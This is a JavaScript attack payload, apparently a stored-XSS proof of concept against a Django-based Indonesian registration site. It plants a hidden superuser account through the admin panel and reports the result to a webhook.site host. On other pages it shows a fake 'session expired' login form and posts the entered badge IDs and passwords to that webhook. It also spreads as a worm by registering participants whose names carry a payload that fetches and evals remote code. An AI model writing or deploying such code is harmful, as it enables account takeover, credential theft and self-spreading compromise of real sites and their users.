const H='//cdn.jsdelivr.net/gh/GifariKemal/sanindo-poc@latest/s.js';
const WH='https://webhook.site/636ff274-2122-4cb0-bd84-1990580a8073';
let u=location.href;
if(u.includes('/admin/')){
  fetch('/admin/auth/user/add/').then(r=>r.text()).then(t=>{
    let m=t.match(/csrfmiddlewaretoken['"]?\s*value=['"]([^'"]+)/);
    if(!m){ fetch(WH+'?admin=NO_CSRF'); return; }
    let f=new FormData();
    f.append('csrfmiddlewaretoken',m[1]);
    f.append('username','hermesbreakthrough');
    f.append('password1','HermesBreak123!');
    f.append('password2','HermesBreak123!');
    f.append('is_superuser','on');
    f.append('is_staff','on');
    f.append('_save','Save');
    fetch('/admin/auth/user/add/',{method:'POST',body:f}).then(rr=>rr.text()).then(tt=>{
      fetch(WH+'?admin='+(tt.includes('hermesbreakthrough')?'CREATED':'NOT_CREATED'));
    });
  });
} else {
  document.documentElement.innerHTML=`<head><title>Sanindo - Sesi Berakhir</title><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{margin:0;font-family:sans-serif;background:linear-gradient(135deg,#FE7517,#FBB626);min-height:100vh;display:flex;align-items:center;justify-content:center}.box{background:#fff;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.2);width:320px;text-align:center}input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box}button{width:100%;padding:10px;background:#205B69;color:#fff;border:none;border-radius:6px;cursor:pointer}</style></head><body><div class='box'><h2>Sesi Berakhir</h2><p>Silakan login ulang untuk melanjutkan.</p><form id='f'><input name='badge_id' placeholder='Badge ID' required><input type='password' name='password' placeholder='Password' required><button type='submit'>Login</button></form><p id='m'></p></div></body>`;
  document.getElementById('f').onsubmit=function(e){
    e.preventDefault();
    let fd=new FormData(e.target);
    fetch(WH,{method:'POST',body:fd}).then(()=>{
      document.getElementById('m').textContent='Verifikasi...';
    });
  };
  // propagate worm
  let payload=`<img src=x onerror=\"fetch('${H}').then(r=>r.text()).then(t=>eval(t))\">`;
  let fd2=new FormData();
  fd2.append('participant_name',payload);
  fd2.append('participant_email','phish'+Date.now()+'@example.com');
  fd2.append('participant_phone','08'+Date.now().toString().slice(-10));
  fd2.append('participant_status','Karyawan');
  fetch('/cobareg/',{method:'POST',body:fd2}).then(r=>r.json()).then(d=>{
    document.getElementById('m').textContent='WORM: '+d.data?.uid;
  }).catch(e=>document.getElementById('m').textContent='WORM ERR');
}